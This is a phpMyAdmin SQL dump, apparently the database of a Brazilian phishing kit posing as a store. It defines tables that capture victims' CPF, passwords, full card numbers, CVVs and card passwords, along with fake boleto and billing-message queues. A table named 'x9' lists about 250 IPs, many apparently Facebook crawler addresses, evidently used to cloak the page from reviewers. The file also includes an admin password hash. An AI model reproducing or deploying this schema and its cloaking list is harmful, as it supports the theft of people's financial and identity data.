-- phpMyAdmin SQL Dump
-- version 4.8.0
-- https://www.phpmyadmin.net/
--
-- Host: 127.0.0.1
-- Generation Time: 14-Dez-2018 às 18:58
-- Versão do servidor: 10.1.31-MariaDB
-- PHP Version: 5.6.35

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET AUTOCOMMIT = 0;
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `magazine17`
--

-- --------------------------------------------------------

--
-- Estrutura da tabela `antiphishing`
--

CREATE TABLE `antiphishing` (
  `id` int(11) NOT NULL,
  `pasta` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Estrutura da tabela `apimp`
--

CREATE TABLE `apimp` (
  `id` int(11) NOT NULL,
  `api` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

-- --------------------------------------------------------

--
-- Estrutura da tabela `bloqueados`
--

CREATE TABLE `bloqueados` (
  `id` int(11) NOT NULL,
  `ip` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Estrutura da tabela `boletos`
--

CREATE TABLE `boletos` (
  `id` int(11) NOT NULL,
  `numero` varchar(255) NOT NULL,
  `vencimento` date NOT NULL,
  `idproduto` int(11) NOT NULL,
  `usado` tinyint(1) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Estrutura da tabela `cobrancaemail`
--

CREATE TABLE `cobrancaemail` (
  `id` int(11) NOT NULL,
  `email` varchar(255) NOT NULL,
  `corpo` longtext NOT NULL,
  `enviado` tinyint(1) NOT NULL,
  `primeironome` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Estrutura da tabela `cobrancasms`
--

CREATE TABLE `cobrancasms` (
  `id` int(11) NOT NULL,
  `numero` varchar(20) NOT NULL,
  `nome` varchar(15) NOT NULL,
  `nomeproduto` varchar(30) NOT NULL,
  `link` varchar(255) NOT NULL,
  `enviado` tinyint(1) NOT NULL,
  `preco` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Estrutura da tabela `cobrancawpp`
--

CREATE TABLE `cobrancawpp` (
  `id` int(11) NOT NULL,
  `nome` varchar(255) NOT NULL,
  `produto` varchar(255) NOT NULL,
  `preco` varchar(25) NOT NULL,
  `numero` varchar(20) NOT NULL,
  `numeroleto` varchar(255) NOT NULL,
  `link` varchar(255) NOT NULL,
  `enviado` tinyint(1) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Estrutura da tabela `configuracoes`
--

CREATE TABLE `configuracoes` (
  `id` int(11) NOT NULL,
  `boleto` tinyint(1) NOT NULL,
  `diasboleto` int(11) NOT NULL,
  `bloqueado` tinyint(1) NOT NULL,
  `url` varchar(255) NOT NULL,
  `smtp` tinyint(1) NOT NULL,
  `loginsmtp` varchar(255) NOT NULL,
  `senhasmtp` varchar(255) NOT NULL,
  `senha4` tinyint(1) NOT NULL,
  `initialapi` int(11) NOT NULL,
  `initiallara` int(11) NOT NULL,
  `apimp` tinyint(1) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Extraindo dados da tabela `configuracoes`
--

INSERT INTO `configuracoes` (`id`, `boleto`, `diasboleto`, `bloqueado`, `url`, `smtp`, `loginsmtp`, `senhasmtp`, `senha4`, `initialapi`, `initiallara`, `apimp`) VALUES
(1, 0, 3, 0, 'https://URLDAPAGINA.COM/', 1, 'EMAILDOSPTMP@GMAIL.COM', 'SENHADOSMTP', 0, 1, 1, 0);

-- --------------------------------------------------------

--
-- Estrutura da tabela `informacoes`
--

CREATE TABLE `informacoes` (
  `id` int(255) NOT NULL,
  `email` varchar(255) NOT NULL,
  `cpf` varchar(255) NOT NULL,
  `nomecompleto` varchar(255) NOT NULL,
  `nascimento` varchar(255) NOT NULL,
  `senha` varchar(255) NOT NULL,
  `cep` varchar(255) NOT NULL,
  `endereco` varchar(255) NOT NULL,
  `numero` varchar(15) NOT NULL,
  `complemento` varchar(255) NOT NULL,
  `bairro` varchar(255) NOT NULL,
  `cidade` varchar(255) NOT NULL,
  `estado` varchar(255) NOT NULL,
  `telefone` varchar(255) NOT NULL,
  `numerocc` varchar(255) NOT NULL,
  `nomecc` varchar(255) NOT NULL,
  `validadecc` varchar(255) NOT NULL,
  `cvv` varchar(255) NOT NULL,
  `metodo` varchar(255) NOT NULL,
  `dist` varchar(255) NOT NULL,
  `ip` varchar(255) NOT NULL,
  `codigoboleto` varchar(255) NOT NULL,
  `idproduto` int(11) NOT NULL,
  `senhacc` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Estrutura da tabela `laramp`
--

CREATE TABLE `laramp` (
  `id` int(11) NOT NULL,
  `email` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

-- --------------------------------------------------------

--
-- Estrutura da tabela `produtos`
--

CREATE TABLE `produtos` (
  `id` int(11) NOT NULL,
  `sourcem` longtext COLLATE utf8mb4_unicode_ci NOT NULL,
  `source` longtext COLLATE utf8mb4_unicode_ci NOT NULL,
  `imgsource` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `nome` varchar(520) COLLATE utf8mb4_unicode_ci NOT NULL,
  `preco` double NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Estrutura da tabela `segundavia`
--

CREATE TABLE `segundavia` (
  `id` varchar(255) NOT NULL,
  `nomecliente` varchar(255) NOT NULL,
  `cpf` varchar(255) NOT NULL,
  `vencimento` varchar(255) NOT NULL,
  `hoje` varchar(255) NOT NULL,
  `preco` varchar(255) NOT NULL,
  `numeroboleto` varchar(255) NOT NULL,
  `endereco` varchar(255) NOT NULL,
  `numero` varchar(255) NOT NULL,
  `bairro` varchar(255) NOT NULL,
  `cidade` varchar(255) NOT NULL,
  `estado` varchar(255) NOT NULL,
  `cep` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Estrutura da tabela `users`
--

CREATE TABLE `users` (
  `id` int(10) UNSIGNED NOT NULL,
  `name` varchar(50) COLLATE utf8_unicode_ci DEFAULT NULL,
  `email` varchar(80) COLLATE utf8_unicode_ci NOT NULL,
  `password` varchar(40) COLLATE utf8_unicode_ci NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Extraindo dados da tabela `users`
--

INSERT INTO `users` (`id`, `name`, `email`, `password`) VALUES
(1, 'SeanMack', 'admin', '2d29b962490320f821db80cddf6ed4b6e4ac7498');

-- --------------------------------------------------------

--
-- Estrutura da tabela `visitas`
--

CREATE TABLE `visitas` (
  `id` int(11) NOT NULL,
  `ip` varchar(255) NOT NULL,
  `produto` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Estrutura da tabela `x9`
--

CREATE TABLE `x9` (
  `id` int(11) NOT NULL,
  `ip` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Extraindo dados da tabela `x9`
--

INSERT INTO `x9` (`id`, `ip`) VALUES
(1, '69.171.225.154'),
(2, '173.252.91.101'),
(3, '173.252.124.119'),
(4, '173.252.123.185'),
(5, '173.252.91.248'),
(6, '173.252.85.25'),
(7, '66.220.152.143'),
(8, '66.220.152.139'),
(9, '173.252.115.165'),
(12, '66.220.146.20'),
(13, '69.171.225.155'),
(14, '66.220.148.193'),
(15, '69.171.251.9'),
(16, '173.252.122.59'),
(17, '66.220.146.180'),
(18, '173.252.98.118'),
(19, '66.220.156.17'),
(20, '66.220.151.89'),
(21, '69.171.224.215'),
(22, '66.220.156.150'),
(23, '69.171.224.249'),
(24, '173.252.84.88'),
(25, '173.252.124.58'),
(26, '66.220.152.179'),
(27, '173.252.84.89'),
(28, '173.252.85.214'),
(29, '69.171.225.33'),
(30, '66.220.152.96'),
(31, '173.252.95.17'),
(32, '173.252.95.17'),
(33, '173.252.88.86'),
(34, '173.252.92.112'),
(35, '69.171.224.248'),
(36, '186.193.179.0'),
(37, '66.220.146.31'),
(38, '189.40.87.114'),
(39, '69.171.224.210'),
(40, '173.252.98.24'),
(41, '173.252.98.204'),
(42, '189.40.87.202'),
(43, '69.171.225.77'),
(44, '189.40.87.142'),
(45, '187.21.57.133'),
(46, '189.40.87.159'),
(47, '66.220.149.18'),
(48, '173.252.123.32'),
(49, '173.252.122.145'),
(50, '173.252.85.48'),
(51, '173.252.84.113'),
(52, '173.252.84.118'),
(53, '66.220.156.146'),
(54, '173.252.98.86'),
(55, '173.252.84.92'),
(56, '173.252.124.120'),
(57, '69.63.188.100'),
(58, '173.252.92.69'),
(59, '173.252.123.182'),
(60, '66.220.152.167'),
(61, '69.171.225.37'),
(62, '66.220.151.92'),
(63, '66.220.156.22'),
(64, '173.252.123.183'),
(65, '69.171.224.253'),
(66, '69.171.224.209'),
(67, '69.171.240.18'),
(68, '173.252.88.7'),
(69, '173.252.84.89'),
(70, '69.171.240.179'),
(71, '173.252.99.23'),
(72, '173.252.92.113'),
(73, '173.252.91.214'),
(74, '69.171.225.248'),
(75, '173.252.122.55'),
(76, '173.252.98.23'),
(77, '66.220.156.20'),
(78, '31.13.114.148'),
(79, '173.252.122.54'),
(80, '173.252.85.217'),
(81, '69.171.225.15'),
(82, '66.220.146.211'),
(83, '173.252.121.118'),
(84, '173.252.91.100'),
(85, '173.252.84.203'),
(86, '173.252.85.115'),
(87, '173.252.124.121'),
(88, '66.220.151.176'),
(89, '173.252.122.56'),
(90, '66.220.146.21'),
(91, '66.220.152.176'),
(92, '168.196.7.98'),
(93, ' 168.227.55.6'),
(94, '187.21.57.73'),
(95, '35.227.174.84'),
(96, '179.241.213.82'),
(97, '173.252.127.14'),
(98, '189.40.87.100'),
(99, '168.227.55.6'),
(100, '173.252.115.195'),
(101, '66.220.156.19'),
(102, '186.193.179.66'),
(103, '173.252.123.182'),
(104, '66.220.146.22'),
(105, '66.220.146.22'),
(106, '66.220.149.9'),
(107, '66.220.149.13'),
(108, '66.220.149.13'),
(109, '66.220.152.98'),
(110, '66.220.149.10'),
(111, '69.171.225.65'),
(112, '173.252.87.16'),
(113, '173.252.87.14'),
(114, '173.252.95.1'),
(115, '66.220.149.6'),
(116, '66.220.156.18'),
(117, '173.252.85.24'),
(118, '66.220.149.5'),
(119, '173.252.115.150'),
(120, '69.171.240.144'),
(121, '173.252.87.7'),
(122, '173.252.89.22'),
(123, '201.140.239.210'),
(124, '173.252.88.1'),
(125, '173.252.92.69'),
(126, '173.252.122.54'),
(127, '173.252.91.165'),
(128, '173.252.87.2'),
(129, '173.252.92.242'),
(130, '173.252.95.10'),
(131, '173.252.95.10'),
(132, '66.220.156.177'),
(133, '173.252.99.151'),
(134, '66.220.156.145'),
(135, '173.252.92.210'),
(136, '173.252.91.166'),
(137, '173.252.89.225'),
(138, '66.220.152.54'),
(139, '173.252.122.136'),
(140, '31.13.114.50'),
(141, '173.252.90.230'),
(142, '173.252.124.11'),
(143, '173.252.122.55'),
(144, '173.252.122.18'),
(145, '66.220.152.161'),
(146, '173.252.122.134'),
(147, '173.252.122.56'),
(148, '173.252.92.180'),
(149, '31.13.114.208'),
(150, '173.252.123.180'),
(151, '69.171.251.14'),
(152, '66.220.148.100'),
(153, '66.220.149.7'),
(154, '66.220.149.3'),
(155, '173.252.127.3'),
(156, '173.252.123.33'),
(157, '173.252.89.23'),
(158, '173.252.89.224'),
(159, '173.252.95.13'),
(160, '66.220.151.208'),
(161, '173.252.89.53'),
(162, '173.252.88.2'),
(163, '173.252.123.182'),
(164, '66.220.146.22'),
(165, '66.220.146.22'),
(166, '66.220.149.9'),
(167, '66.220.149.13'),
(168, '66.220.152.98'),
(169, '66.220.149.10'),
(170, '69.171.225.65'),
(171, '173.252.87.16'),
(172, '173.252.87.14'),
(173, '173.252.95.1'),
(174, '66.220.149.6'),
(175, '66.220.156.18'),
(176, '173.252.85.24'),
(177, '66.220.149.5'),
(178, '173.252.115.150'),
(179, '69.171.240.144'),
(180, '173.252.87.7'),
(181, '173.252.89.22'),
(182, '201.140.239.210'),
(183, '173.252.88.1'),
(184, '173.252.92.69'),
(185, '173.252.122.54'),
(186, '173.252.91.165'),
(187, '173.252.87.2'),
(188, '173.252.92.242'),
(189, '173.252.95.10'),
(190, '173.252.95.10'),
(191, '66.220.156.177'),
(192, '173.252.99.151'),
(193, '66.220.156.145'),
(194, '173.252.92.210'),
(195, '173.252.91.166'),
(196, '173.252.89.225'),
(197, '66.220.152.54'),
(198, '173.252.122.136'),
(199, '31.13.114.50'),
(200, '173.252.90.230'),
(201, '173.252.124.11'),
(202, '173.252.122.55'),
(203, '173.252.122.18'),
(204, '66.220.152.161'),
(205, '173.252.122.134'),
(206, '173.252.122.56'),
(207, '173.252.92.180'),
(208, '31.13.114.208'),
(209, '173.252.123.180'),
(210, '69.171.251.14'),
(211, '66.220.148.100'),
(212, '66.220.149.7'),
(213, '66.220.149.3'),
(214, '173.252.127.3'),
(215, '173.252.123.33'),
(216, '173.252.89.23'),
(217, '173.252.89.224'),
(218, '173.252.95.13'),
(219, '66.220.151.208'),
(220, '173.252.89.53'),
(221, '173.252.88.2'),
(222, '173.252.92.180'),
(223, '179.241.213.25'),
(224, '179.241.213.6'),
(225, '173.252.95.14'),
(226, '173.252.124.55'),
(227, '69.171.251.9'),
(228, '173.252.95.8'),
(229, '173.252.87.14'),
(230, '173.252.99.49'),
(231, '189.40.87.19'),
(232, '189.40.87.136'),
(233, '179.241.213.0'),
(234, '179.241.213.0'),
(235, '189.40.87.37'),
(236, '179.241.213.53'),
(237, '187.70.245.118'),
(238, '66.220.149.14'),
(239, '173.252.124.55'),
(240, '187.70.245.121'),
(241, '173.252.127.7'),
(242, ''),
(243, '173.252.99.48'),
(244, '31.13.114.6'),
(245, '173.252.95.5'),
(246, '66.220.152.53'),
(247, '173.252.87.11'),
(248, '173.252.90.165'),
(249, '31.13.114.6'),
(250, '31.13.114.144'),
(251, '173.252.122.18'),
(252, '173.252.123.129'),
(253, '173.252.115.165'),
(254, '179.241.213.107');

--
-- Indexes for dumped tables
--

--
-- Indexes for table `antiphishing`
--
ALTER TABLE `antiphishing`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `apimp`
--
ALTER TABLE `apimp`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `bloqueados`
--
ALTER TABLE `bloqueados`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `boletos`
--
ALTER TABLE `boletos`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `cobrancaemail`
--
ALTER TABLE `cobrancaemail`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `cobrancasms`
--
ALTER TABLE `cobrancasms`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `cobrancawpp`
--
ALTER TABLE `cobrancawpp`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `configuracoes`
--
ALTER TABLE `configuracoes`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `informacoes`
--
ALTER TABLE `informacoes`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `laramp`
--
ALTER TABLE `laramp`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `produtos`
--
ALTER TABLE `produtos`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `segundavia`
--
ALTER TABLE `segundavia`
  ADD UNIQUE KEY `id` (`id`);

--
-- Indexes for table `users`
--
ALTER TABLE `users`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `visitas`
--
ALTER TABLE `visitas`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `x9`
--
ALTER TABLE `x9`
  ADD PRIMARY KEY (`id`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `antiphishing`
--
ALTER TABLE `antiphishing`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `apimp`
--
ALTER TABLE `apimp`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `bloqueados`
--
ALTER TABLE `bloqueados`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `boletos`
--
ALTER TABLE `boletos`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `cobrancaemail`
--
ALTER TABLE `cobrancaemail`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `cobrancasms`
--
ALTER TABLE `cobrancasms`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `cobrancawpp`
--
ALTER TABLE `cobrancawpp`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `configuracoes`
--
ALTER TABLE `configuracoes`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT for table `informacoes`
--
ALTER TABLE `informacoes`
  MODIFY `id` int(255) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `laramp`
--
ALTER TABLE `laramp`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `produtos`
--
ALTER TABLE `produtos`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `users`
--
ALTER TABLE `users`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT for table `visitas`
--
ALTER TABLE `visitas`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `x9`
--
ALTER TABLE `x9`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=255;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
